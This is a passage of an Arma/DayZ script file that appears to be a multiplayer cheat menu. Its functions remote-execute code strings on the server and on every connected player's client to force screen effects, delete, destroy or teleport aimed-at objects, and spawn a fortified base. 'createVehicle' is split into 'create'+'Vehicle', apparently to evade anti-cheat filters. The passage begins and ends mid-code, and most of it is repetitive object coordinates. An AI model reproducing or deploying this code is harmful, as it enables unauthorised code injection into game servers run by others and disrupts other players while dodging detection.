	};", _list];
	[_agod] call Wookie_Pro_RE;

};

Wookie_Remove_VF_a =
{
	_reeeee = format["

		ppEffectDestroy ppColor;
		ppEffectDestroy ppBlur;
		ppEffectDestroy ppInversion;
		ppEffectDestroy ppGrain;
		ppEffectDestroy nonapsi_ef;
		ppEffectDestroy nonapsi_ef2;
		deletevehicle snow;
		deletevehicle ps;
		ppEffectDestroy ppe;
		ppEffectDestroy ppe2;
		ppEffectDestroy ppe3;
		ppEffectDestroy wetdist1;
		setaperture 0;
		""dynamicBlur"" ppEffectAdjust [0];
		""dynamicBlur"" ppEffectCommit 16;

		""colorCorrections"" ppEffectAdjust [1, 1, 0, [1, 1, 1, 0.0], [1, 1, 1, 1],  [1, 1, 1, 0.0]];
		""colorCorrections"" ppEffectCommit 0;
	
	"];
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on all"];
	cutText [format["executed on all"], "PLAIN DOWN"];
};

Wookie_Wasteland_VF_a =
{
	_reeeee = "

		""colorCorrections"" ppEffectAdjust [2, 30, 0, [0.0, 0.0, 0.0, 0.0], [0.8*2, 0.5*2, 0.0, 0.7], [0.9, 0.9, 0.9, 0.0]];
		""colorCorrections"" ppEffectCommit 0;
		""colorCorrections"" ppEffectAdjust [1, 0.8, -0.001, [0.0, 0.0, 0.0, 0.0], [0.8*2, 0.5*2, 0.0, 0.7], [0.9, 0.9, 0.9, 0.0]];  
		""colorCorrections"" ppEffectCommit 3;
		""colorCorrections"" ppEffectEnable true;
		""filmGrain"" ppEffectEnable true; 
		""filmGrain"" ppEffectAdjust [0.02, 1, 1, 0.1, 1, false];
		""filmGrain"" ppEffectCommit 5;


		[] spawn {
			waituntil {isplayer player};
			setwind [0.201112,0.204166,true];
			while {true} do {
				_ran = ceil random 5;
				playsound format [""wind_%1"",_ran];
				_obj = vehicle player;
				_pos = getPosATL _obj;


				setwind [0.201112*2,0.204166*2,false];
				_velocity = [random 10,random 10,-1];
				_color = [1.0, 0.9, 0.8];
				_alpha = 0.02 + random 0.02;
				_ps = ""#particlesource"" createVehicleLocal _pos;  
				_ps setParticleParams [[""A3\Data_f\ParticleEffects\Universal\universal.p3d"", 16, 12, 8], """", ""Billboard"", 1, 3, [0, 0, -6], _velocity, 1, 1.275, 1, 0, [9], [_color + [0], _color + [_alpha], _color + [0]], [1000], 1, 0, """", """", _obj];
				_ps setParticleRandom [3, [30, 30, 0], [0, 0, 0], 1, 0, [0, 0, 0, 0.01], 0, 0];
				_ps setParticleCircle [0.1, [0, 0, 0]];
				_ps setDropInterval 0.01;

				sleep (random 1);
				deletevehicle _ps;
				_delay = 10 + random 20;
				sleep _delay;
			};
		};


		[] spawn {
			waituntil {isplayer player};
			_pos = getPosATL player;
			_parray = [
				[""A3\Data_f\ParticleEffects\Universal\Universal"", 16, 12, 8, 1],
				"""",
				""Billboard"",
				1,
				4,
				[0,0,0],
				[0,0,0],
				1,
				0.000001,
				0,
				1.4,
				[0.05,0.05],
				[[0.1,0.1,0.1,1]],
				[0,1],
				0.2,
				1.2,
				"""",
				"""",
				vehicle player
			];
			_snow = ""#particlesource"" createVehicleLocal _pos;  
			_snow setParticleParams _parray;
			_snow setParticleRandom [0, [10, 10, 7], [0, 0, 0], 0, 0.01, [0, 0, 0, 0.1], 0, 0];
			_snow setParticleCircle [0.0, [0, 0, 0]];
			_snow setDropInterval 0.01;

			_oldPlayer = vehicle player;
			while {true} do {
				waituntil {vehicle player != _oldPlayer};
				_parray set [18,vehicle player];
				_snow setParticleParams _parray;
				_oldPlayer = vehicle player;
			};
		};

	";
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on all"];
	cutText [format["executed on all"], "PLAIN DOWN"];
};

Wookie_BlackNWhite_VF_a =
{
	_reeeee = format["

		setaperture 24;
		ppColor = ppEffectCreate [""ColorCorrections"", 1999];
		ppColor ppEffectEnable true;
		ppColor ppEffectAdjust [1, 1, 0, [1, 1, 1, 0], [1, 1, 1, 0.0], [1, 1, 1, 1.0]];
		ppColor ppEffectCommit 0;

		ppBlur = ppEffectCreate [""dynamicBlur"", 505];
		ppBlur ppEffectEnable true; 
		ppBlur ppEffectAdjust [.5];
		ppBlur ppEffectCommit 0;

		ppInversion = ppEffectCreate ['colorInversion', 2555];
		ppInversion ppEffectEnable true;
		ppInversion ppEffectAdjust [1,1,1];
		ppInversion ppEffectCommit 0;

		ppGrain = ppEffectCreate [""filmGrain"", 2005];
		ppGrain ppEffectEnable true;
		ppGrain ppEffectAdjust [0.02, 1, 1, 0, 1];
		ppGrain ppEffectCommit 0;
	
	"];
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on all"];
	cutText [format["executed on all"], "PLAIN DOWN"];
};

Wookie_Spiderman_VF_a =
{
	_reeeee = format["

		ppe = ppEffectCreate [""colorCorrections"", 1555]; 
		ppe ppEffectAdjust [1, 1, 0, [1.5,-1,-1.5,0.5], [5,3.5,-5,-0.5], [-3,5,-5,-0.5]]; 
		ppe ppEffectCommit 1;
		ppe ppEffectEnable true; 
		ppe2 = ppEffectCreate [""chromAberration"", 1555]; 
		ppe2 ppEffectAdjust [0.01,0.01,true];
		ppe2 ppEffectCommit 1;
		ppe2 ppEffectEnable true;
		ppe3 = ppEffectCreate [""radialBlur"", 1555]; 
		ppe3 ppEffectEnable true;
		ppe3 ppEffectAdjust [0.02,0.02,0.15,0.15]; 
		ppe3 ppEffectCommit 1;
	
	"];
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on all"];
	cutText [format["executed on all"], "PLAIN DOWN"];
};

Wookie_Gloomy_VF_a =
{
	_reeeee = format["

		ppe = ppEffectCreate [""colorCorrections"", 1555]; 
		ppe ppEffectAdjust [1, 0.75, 0, [0.8,0.9,1,-0.1], [1,1,1,2], [-0.5,0,-1,5]]; 
		ppe ppEffectCommit 1;
		ppe ppEffectEnable true; 
		ppe2 = ppEffectCreate [""filmGrain"", 1555]; 
		ppe2 ppEffectAdjust [0.1, -1, 0.1, 0.05, 2, false]; 
		ppe2 ppEffectCommit 1;
		ppe2 ppEffectEnable true;
	
	"];
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on all"];
	cutText [format["executed on all"], "PLAIN DOWN"];
};

Wookie_DeleteCursor =
{
	_x = cursorTarget;
	deleteVehicle _x;

	cutText [format["%1 DELETED", _x], "PLAIN DOWN"];
};

Wookie_KillCursor =
{
	_aim = cursorTarget;
	if (_aim != player) then
	{
		_aim setDamage 1;
		cutText [format["%1 Destroyed", _aim], "PLAIN"];
	};
};

Wookie_TPCursor =
{
	_dir = getDir player;
	_target = cursorTarget;
	_target setPosATL [(getPosATL player select 0)+5*sin(_dir),(getPosATL player select 1)+5*cos(_dir),getPosATL player select 2];
	cutText [format["%1 Teleported",_target], "PLAIN"];
};

Wookie_Base = {spwnn = 
{
	_dir = _this select 0;
	_pos = _this select 1;
	_veh = _this select 2;

	_spwnvehh = format ['if (isServer) then 
	{
		_charID =0;
		object = nil;
		_worldspace = [%1,%2];
		_className = "%3";
		_id = 0;

		_dir = _worldspace select 0;
		_location = _worldspace select 1;

		call compile ("object = create"+"Vehicle [_className, _location, [], 0, """"];
		object setdir _dir;
		object setPosATL _location;
		object setVariable [""OwnerID"", _charID, true];");


		dayz_serverObjectMonitor set [count dayz_serverObjectMonitor,object];


		_uid = object call dayzobjectUID;

		object setVariable ["ObjectUID", _uid, true];
	};',_dir,_pos,_veh];
	[_spwnvehh] call Rustler_RE;
};


basespawn = '
if (isServer) then {
call compile (''

_vehicle_1 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11439.901, 11355.569, 9.1552734e-005], [], 0, ""];
  _vehicle_1 = _this;
  _this setDir -57.571751;
  _this setPosATL [11439.901, 11355.569, 9.1552734e-005];
};
 
_vehicle_2 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11447.895, 11368.803, 6.1035156e-005], [], 0, ""];
  _vehicle_2 = _this;
  _this setDir -56.038086;
  _this setPosATL [11447.895, 11368.803, 6.1035156e-005];
};
 
_vehicle_4 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11436.022, 11348.614, -6.1035156e-005], [], 0, ""];
  _vehicle_4 = _this;
  _this setDir -58.73452;
  _this setPosATL [11436.022, 11348.614, -6.1035156e-005];
};
 
_vehicle_5 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11431.824, 11341.612, -9.1552734e-005], [], 0, ""];
  _vehicle_5 = _this;
  _this setDir -57.675713;
  _this setPosATL [11431.824, 11341.612, -9.1552734e-005];
};
 
_vehicle_6 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11452.258, 11375.609, -6.1035156e-005], [], 0, ""];
  _vehicle_6 = _this;
  _this setDir -54.991661;
  _this setPosATL [11452.258, 11375.609, -6.1035156e-005];
};
 
_vehicle_9 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11432.384, 11336.868], [], 0, ""];
  _vehicle_9 = _this;
  _this setDir 31.483263;
  _this setPosATL [11432.384, 11336.868];
};
 
_vehicle_10 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11439.256, 11333.118, 3.0517578e-005], [], 0, ""];
  _vehicle_10 = _this;
  _this setDir 29.730112;
  _this setPosATL [11439.256, 11333.118, 3.0517578e-005];
};
 
_vehicle_11 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11446.237, 11329.521, -3.0517578e-005], [], 0, ""];
  _vehicle_11 = _this;
  _this setDir 28.864544;
  _this setPosATL [11446.237, 11329.521, -3.0517578e-005];
};
 
_vehicle_16 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11457.766, 11378.072, 9.1552734e-005], [], 0, ""];
  _vehicle_16 = _this;
  _this setDir 33.478828;
  _this setPosATL [11457.766, 11378.072, 9.1552734e-005];
};
 
_vehicle_17 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11464.363, 11373.783, -9.1552734e-005], [], 0, ""];
  _vehicle_17 = _this;
  _this setDir 36.929874;
  _this setPosATL [11464.363, 11373.783, -9.1552734e-005];
};
 
_vehicle_18 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11470.912, 11369.29, -3.0517578e-005], [], 0, ""];
  _vehicle_18 = _this;
  _this setDir 35.566692;
  _this setPosATL [11470.912, 11369.29, -3.0517578e-005];
};
 
_vehicle_19 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11477.855, 11364.819, 9.1552734e-005], [], 0, ""];
  _vehicle_19 = _this;
  _this setDir 33.829044;
  _this setPosATL [11477.855, 11364.819, 9.1552734e-005];
};
 
_vehicle_20 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11484.352, 11360.668], [], 0, ""];
  _vehicle_20 = _this;
  _this setDir 33.890343;
  _this setPosATL [11484.352, 11360.668];
};
 
_vehicle_21 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11491.273, 11356.188, 6.1035156e-005], [], 0, ""];
  _vehicle_21 = _this;
  _this setDir 36.419662;
  _this setPosATL [11491.273, 11356.188, 6.1035156e-005];
};
 
_vehicle_24 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11489.065, 11328.864, 6.1035156e-005], [], 0, ""];
  _vehicle_24 = _this;
  _this setDir -58.088871;
  _this setPosATL [11489.065, 11328.864, 6.1035156e-005];
};
 
_vehicle_25 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11492.816, 11335.528, 6.1035156e-005], [], 0, ""];
  _vehicle_25 = _this;
  _this setDir -58.149261;
  _this setPosATL [11492.816, 11335.528, 6.1035156e-005];
};
 
_vehicle_26 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11496.767, 11342.588, 3.0517578e-005], [], 0, ""];
  _vehicle_26 = _this;
  _this setDir -57.671761;
  _this setPosATL [11496.767, 11342.588, 3.0517578e-005];
};
 
_vehicle_27 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11499.556, 11347.174, 6.1035156e-005], [], 0, ""];
  _vehicle_27 = _this;
  _this setDir -56.153603;
  _this setPosATL [11499.556, 11347.174, 6.1035156e-005];
};
 
_vehicle_28 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11497.892, 11352.113, -6.1035156e-005], [], 0, ""];
  _vehicle_28 = _this;
  _this setDir 30.607037;
  _this setPosATL [11497.892, 11352.113, -6.1035156e-005];
};
 
_vehicle_32 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_fort_bagfence_long", [11443.847, 11366.553], [], 0, ""];
  _vehicle_32 = _this;
  _this setDir 31.873875;
  _this setPosATL [11443.847, 11366.553];
};
 
_vehicle_33 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_fort_bagfence_long", [11440.032, 11360.258], [], 0, ""];
  _vehicle_33 = _this;
  _this setDir 35.021729;
  _this setPosATL [11440.032, 11360.258];
};
 
_vehicle_34 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_fort_bagfence_long", [11437.566, 11362.039, 0.00012207031], [], 0, ""];
  _vehicle_34 = _this;
  _this setDir 37.687099;
  _this setPosATL [11437.566, 11362.039, 0.00012207031];
};
 
_vehicle_35 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_fort_bagfence_long", [11441.323, 11368.182, -9.1552734e-005], [], 0, ""];
  _vehicle_35 = _this;
  _this setDir 32.117691;
  _this setPosATL [11441.323, 11368.182, -9.1552734e-005];
};
 
_vehicle_36 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_fort_bagfence_long", [11438.859, 11369.827, -9.1552734e-005], [], 0, ""];
  _vehicle_36 = _this;
  _this setDir 34.523594;
  _this setPosATL [11438.859, 11369.827, -9.1552734e-005];
};
 
_vehicle_37 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_fort_bagfence_long", [11435.254, 11363.823, 3.0517578e-005], [], 0, ""];
  _vehicle_37 = _this;
  _this setDir 36.59647;
  _this setPosATL [11435.254, 11363.823, 3.0517578e-005];
};
 
_vehicle_39 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fort_Watchtower", [11457.722, 11372.19], [], 0, ""];
  _vehicle_39 = _this;
  _this setDir 122.21871;
  _this setPosATL [11457.722, 11372.19];
};
 
_vehicle_40 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fort_Watchtower", [11437.779, 11339.775, -3.0517578e-005], [], 0, ""];
  _vehicle_40 = _this;
  _this setDir 120.26463;
  _this setPosATL [11437.779, 11339.775, -3.0517578e-005];
};
 
_vehicle_48 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_fort_rampart", [11442.052, 11368.356], [], 0, ""];
  _vehicle_48 = _this;
  _this setDir -147.1685;
  _this setPosATL [11442.052, 11368.356];
};
 
_vehicle_49 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_fort_rampart", [11436.471, 11361.966, 6.1035156e-005], [], 0, ""];
  _vehicle_49 = _this;
  _this setDir 36.184361;
  _this setPosATL [11436.471, 11361.966, 6.1035156e-005];
};
 
_vehicle_57 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["HeliH", [11484.756, 11347.3, 0], [], 0, ""];
  _vehicle_57 = _this;
  _this setPosATL [11484.756, 11347.3, 0];
};
 
_vehicle_59 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Ind_TankSmall2_EP1", [11451.532, 11368.337, 6.1035156e-005], [], 0, ""];
  _vehicle_59 = _this;
  _this setDir -59.051876;
  _this setPosATL [11451.532, 11368.337, 6.1035156e-005];
};
 
_vehicle_60 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Ind_TankSmall2_EP1", [11439.12, 11347.224], [], 0, ""];
  _vehicle_60 = _this;
  _this setDir -59.064602;
  _this setPosATL [11439.12, 11347.224];
};
 
_vehicle_69 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["HeliH", [11468.185, 11358.496, -3.0517578e-005], [], 0, ""];
  _vehicle_69 = _this;
  _this setPosATL [11468.185, 11358.496, -3.0517578e-005];
};
 
_vehicle_72 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11443.522, 11356.615, 9.1552734e-005], [], 0, ""];
  _vehicle_72 = _this;
  _this setPosATL [11443.522, 11356.615, 9.1552734e-005];
};
 
_vehicle_73 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11448.593, 11365.045, 3.0517578e-005], [], 0, ""];
  _vehicle_73 = _this;
  _this setPosATL [11448.593, 11365.045, 3.0517578e-005];
};
 
_vehicle_74 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11437.561, 11371.68, -9.1552734e-005], [], 0, ""];
  _vehicle_74 = _this;
  _this setPosATL [11437.561, 11371.68, -9.1552734e-005];
};
 
_vehicle_75 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11433.161, 11364.913, 0.00015258789], [], 0, ""];
  _vehicle_75 = _this;
  _this setPosATL [11433.161, 11364.913, 0.00015258789];
};
 
_vehicle_76 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11447.053, 11371.607, -3.0517578e-005], [], 0, ""];
  _vehicle_76 = _this;
  _this setPosATL [11447.053, 11371.607, -3.0517578e-005];
};
 
_vehicle_77 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11437.061, 11355.496, -3.0517578e-005], [], 0, ""];
  _vehicle_77 = _this;
  _this setPosATL [11437.061, 11355.496, -3.0517578e-005];
};
 
_vehicle_78 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11472.649, 11364.813, 6.1035156e-005], [], 0, ""];
  _vehicle_78 = _this;
  _this setPosATL [11472.649, 11364.813, 6.1035156e-005];
};
 
_vehicle_79 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11489.613, 11354.087], [], 0, ""];
  _vehicle_79 = _this;
  _this setPosATL [11489.613, 11354.087];
};
 
_vehicle_81 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Fire_barrel_burning", [11481.271, 11359.609, 3.0517578e-005], [], 0, ""];
  _vehicle_81 = _this;
  _this setPosATL [11481.271, 11359.609, 3.0517578e-005];
};
 
_vehicle_85 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Sign_Checkpoint_EP1", [11436.859, 11371.008, 3.0517578e-005], [], 0, ""];
  _vehicle_85 = _this;
  _this setDir -89.256752;
  _this setPosATL [11436.859, 11371.008, 3.0517578e-005];
};
 
_vehicle_87 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Sign_Checkpoint_US_EP1", [11433.219, 11365.743], [], 0, ""];
  _vehicle_87 = _this;
  _this setDir -16.234076;
  _this setPosATL [11433.219, 11365.743];
};
 
_vehicle_89 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["SignM_UN_Base_EP1", [11453.651, 11379.878, -3.0517578e-005], [], 0, ""];
  _vehicle_89 = _this;
  _this setDir 122.23498;
  _this setPosATL [11453.651, 11379.878, -3.0517578e-005];
};
 
_vehicle_103 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["ZavoraAnim", [11434.194, 11365.333, 9.1552734e-005], [], 0, ""];
  _vehicle_103 = _this;
  _this setDir 125.97052;
  _this setPosATL [11434.194, 11365.333, 9.1552734e-005];
};
 
_vehicle_107 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Toilet", [11441.334, 11351.79, 6.1035156e-005], [], 0, ""];
  _vehicle_107 = _this;
  _this setDir 295.06918;
  _this setPosATL [11441.334, 11351.79, 6.1035156e-005];
};
 
_vehicle_108 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Toilet", [11442.251, 11353.467, 9.1552734e-005], [], 0, ""];
  _vehicle_108 = _this;
  _this setDir -61.998962;
  _this setPosATL [11442.251, 11353.467, 9.1552734e-005];
};
 
_vehicle_109 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_Toilet", [11443.202, 11355.096, 3.0517578e-005], [], 0, ""];
  _vehicle_109 = _this;
  _this setDir -62.591972;
  _this setPosATL [11443.202, 11355.096, 3.0517578e-005];
};
 
_vehicle_127 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Red_Light_Blinking_EP1", [11462.472, 11358.856], [], 0, ""];
  _vehicle_127 = _this;
  _this setPosATL [11462.472, 11358.856];
};
 
_vehicle_128 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Red_Light_Blinking_EP1", [11473.741, 11360.042], [], 0, ""];
  _vehicle_128 = _this;
  _this setPosATL [11473.741, 11360.042];
};
 
_vehicle_129 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Red_Light_Blinking_EP1", [11465.897, 11363.715, -6.1035156e-005], [], 0, ""];
  _vehicle_129 = _this;
  _this setPosATL [11465.897, 11363.715, -6.1035156e-005];
};
 
_vehicle_130 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Red_Light_Blinking_EP1", [11470.706, 11353.28, 3.0517578e-005], [], 0, ""];
  _vehicle_130 = _this;
  _this setPosATL [11470.706, 11353.28, 3.0517578e-005];
};
 
_vehicle_132 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Red_Light_Blinking_EP1", [11479.163, 11348.49, -3.0517578e-005], [], 0, ""];
  _vehicle_132 = _this;
  _this setPosATL [11479.163, 11348.49, -3.0517578e-005];
};
 
_vehicle_133 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Red_Light_Blinking_EP1", [11485.517, 11352.958, 6.1035156e-005], [], 0, ""];
  _vehicle_133 = _this;
  _this setPosATL [11485.517, 11352.958, 6.1035156e-005];
};
 
_vehicle_134 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Red_Light_Blinking_EP1", [11490.463, 11346.29, 0], [], 0, ""];
  _vehicle_134 = _this;
  _this setPosATL [11490.463, 11346.29, 0];
};
 
_vehicle_135 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Red_Light_Blinking_EP1", [11483.178, 11341.694, 3.0517578e-005], [], 0, ""];
  _vehicle_135 = _this;
  _this setPosATL [11483.178, 11341.694, 3.0517578e-005];
};
 
_vehicle_136 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Misc_Wall_lamp", [11456.502, 11371.758, 1.0587187], [], 0, ""];
  _vehicle_136 = _this;
  _this setDir 218.64056;
  _this setPosATL [11456.502, 11371.758, 1.0587187];
};
 
_vehicle_143 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["TK_WarfareBArtilleryRadar_EP1", [11543.364, 11379.038, -0.00012207031], [], 0, ""];
  _vehicle_143 = _this;
  _this setDir 29.736753;
  _this setPosATL [11543.364, 11379.038, -0.00012207031];
};
 
_vehicle_144 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11448.12, 11328.567, 3.0517578e-005], [], 0, ""];
  _vehicle_144 = _this;
  _this setDir 28.209429;
  _this setPosATL [11448.12, 11328.567, 3.0517578e-005];
};
 
_vehicle_148 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11441.072, 11300.184, -3.0517578e-005], [], 0, ""];
  _vehicle_148 = _this;
  _this setDir 31.206694;
  _this setPosATL [11441.072, 11300.184, -3.0517578e-005];
};
 
_vehicle_150 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11447.583, 11296.466, -9.1552734e-005], [], 0, ""];
  _vehicle_150 = _this;
  _this setDir 32.10191;
  _this setPosATL [11447.583, 11296.466, -9.1552734e-005];
};
 
_vehicle_152 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11445.748, 11317.26, -0.00015258789], [], 0, ""];
  _vehicle_152 = _this;
  _this setDir 122.04023;
  _this setPosATL [11445.748, 11317.26, -0.00015258789];
};
 
_vehicle_159 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11449.381, 11324.19, 3.0517578e-005], [], 0, ""];
  _vehicle_159 = _this;
  _this setDir -61.607044;
  _this setPosATL [11449.381, 11324.19, 3.0517578e-005];
};
 
_vehicle_161 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11453.544, 11292.921, -3.0517578e-005], [], 0, ""];
  _vehicle_161 = _this;
  _this setDir -147.55283;
  _this setPosATL [11453.544, 11292.921, -3.0517578e-005];
};
 
_vehicle_162 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11459.907, 11289.211, -0.00024414063], [], 0, ""];
  _vehicle_162 = _this;
  _this setDir 31.248175;
  _this setPosATL [11459.907, 11289.211, -0.00024414063];
};
 
_vehicle_163 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11466.931, 11284.958, -3.0517578e-005], [], 0, ""];
  _vehicle_163 = _this;
  _this setDir 31.338137;
  _this setPosATL [11466.931, 11284.958, -3.0517578e-005];
};
 
_vehicle_164 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11503.441, 11297.207, 6.1035156e-005], [], 0, ""];
  _vehicle_164 = _this;
  _this setDir -63.357956;
  _this setPosATL [11503.441, 11297.207, 6.1035156e-005];
};
 
_vehicle_168 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11491.268, 11323.7, 0.00015258789], [], 0, ""];
  _vehicle_168 = _this;
  _this setDir -150.76132;
  _this setPosATL [11491.268, 11323.7, 0.00015258789];
};
 
_vehicle_170 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11502.716, 11317.027, 3.0517578e-005], [], 0, ""];
  _vehicle_170 = _this;
  _this setDir -149.77863;
  _this setPosATL [11502.716, 11317.027, 3.0517578e-005];
};
 
_vehicle_171 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11496.297, 11320.808, -3.0517578e-005], [], 0, ""];
  _vehicle_171 = _this;
  _this setDir 32.946758;
  _this setPosATL [11496.297, 11320.808, -3.0517578e-005];
};
 
_vehicle_172 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11474.175, 11280.93, -3.0517578e-005], [], 0, ""];
  _vehicle_172 = _this;
  _this setDir 31.355286;
  _this setPosATL [11474.175, 11280.93, -3.0517578e-005];
};
 
_vehicle_173 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11481.516, 11276.684, -9.1552734e-005], [], 0, ""];
  _vehicle_173 = _this;
  _this setDir 31.515644;
  _this setPosATL [11481.516, 11276.684, -9.1552734e-005];
};
 
_vehicle_174 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11488.331, 11272.814, -3.0517578e-005], [], 0, ""];
  _vehicle_174 = _this;
  _this setDir 30.986254;
  _this setPosATL [11488.331, 11272.814, -3.0517578e-005];
};
 
_vehicle_175 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11494.404, 11269.362], [], 0, ""];
  _vehicle_175 = _this;
  _this setDir 31.651138;
  _this setPosATL [11494.404, 11269.362];
};
 
_vehicle_176 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11499.463, 11271.747, -6.1035156e-005], [], 0, ""];
  _vehicle_176 = _this;
  _this setDir -57.459625;
  _this setPosATL [11499.463, 11271.747, -6.1035156e-005];
};
 
_vehicle_177 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11503.548, 11278.718, 0.00012207031], [], 0, ""];
  _vehicle_177 = _this;
  _this setDir -59.604164;
  _this setPosATL [11503.548, 11278.718, 0.00012207031];
};
 
_vehicle_178 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11507.485, 11285.417, 3.0517578e-005], [], 0, ""];
  _vehicle_178 = _this;
  _this setDir -58.68502;
  _this setPosATL [11507.485, 11285.417, 3.0517578e-005];
};
 
_vehicle_179 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11506.731, 11290.382, -3.0517578e-005], [], 0, ""];
  _vehicle_179 = _this;
  _this setDir 30.641911;
  _this setPosATL [11506.731, 11290.382, -3.0517578e-005];
};
 
_vehicle_180 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11504.472, 11291.587, 6.1035156e-005], [], 0, ""];
  _vehicle_180 = _this;
  _this setDir 30.433687;
  _this setPosATL [11504.472, 11291.587, 6.1035156e-005];
};
 
_vehicle_181 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11506.802, 11304.016, 6.1035156e-005], [], 0, ""];
  _vehicle_181 = _this;
  _this setDir -61.906956;
  _this setPosATL [11506.802, 11304.016, 6.1035156e-005];
};
 
_vehicle_182 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11509.415, 11309.148, 3.0517578e-005], [], 0, ""];
  _vehicle_182 = _this;
  _this setDir -60.85429;
  _this setPosATL [11509.415, 11309.148, 3.0517578e-005];
};
 
_vehicle_183 = objNull;
if (true) then
{
  _this = create''+''Vehicle ["Land_HBarrier_large", [11508.061, 11313.979], [], 0, ""];
  _vehicle_183 = _this;
  _this setDir -150.33752;
  _this setPosATL [11508.061, 11313.979];
